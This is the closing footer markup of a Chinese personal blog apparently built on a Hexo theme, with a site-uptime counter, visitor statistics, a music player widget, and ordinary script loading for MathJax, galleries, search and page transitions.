                document.getElementById("statistic-times").innerHTML = "❤️本站自 <strong>"+time.split(" ")[0].replace(/\//g,".")+"</strong> 已运行 <strong>" + dnum + "</strong> 天 <strong>" + hnum + "</strong> 小时 <strong>" + mnum + "</strong> 分 <strong>" + snum + "</strong> 秒！❤️";
        }var now = new Date();setInterval("createTime('2021/08/19 00:00:00')", 250,"");</script><br></span><div class="size-small"><span>❤️感谢 <strong><span id="busuanzi_value_site_uv">99+</span></strong> 小伙伴的 <strong><span id="busuanzi_value_site_pv">99+</span></strong> 次光临！❤️</span></div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a></p></div><div class="sideMusic"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="/js/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script><meting-js style="width: auto;height: 2000px;" server="netease" type="playlist" id="2364053447" theme="#2980b9" loop="all" autoplay="false" order="list" storageName="aplayer-setting" lrctype="0" list-max-height="400px" fixed="true"></meting-js></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/x-mathjax-config">MathJax.Hub.Config({
            'HTML-CSS': {
                matchFontHeight: false
            },
            SVG: {
                matchFontHeight: false
            },
            CommonHTML: {
                matchFontHeight: false
            },
            tex2jax: {
                inlineMath: [
                    ['$','$'],
                    ['\\(','\\)']
                ]
            }
        });</script><script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script><script type="text/javascript">var pjax = new Pjax({
            elements: "a",//代表点击链接就更新
            selectors: [  //代表要更新的节点
                ".section",
                "title"
            ],
            cache: true,
            cacheBust:false
        })

        function loadBusuanzi(){
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
        }

        function loadMathJax() { //加载mathjax
            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\(', '\)']] } });
                var math = document.getElementsByClassName("entry-content")[0];
                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
            });
        };

        // 开始 PJAX 执行的函数
        document.addEventListener('pjax:send', function () {
        });
        
        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
        document.addEventListener('pjax:complete', function () {
            $(".section").css({opacity:1});
            if(false){
                $.getScript('/js/comment-issue-data.js',function(){loadIssueData('undefined','undefined','undefined','undefined',undefined);});
            }
            if(true){
                loadMathJax();
            }
            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
            loadBackTop();
            loadBusuanzi();
            if(typeof loadBanner == 'function'){
                loadBanner();
            }
        });</script><script type="text/javascript">function loadMathJax() { //加载mathjax
            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\(', '\)']] } });
                var math = document.getElementsByClassName("entry-content")[0];
                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
            });
        };loadMathJax();</script></body></html>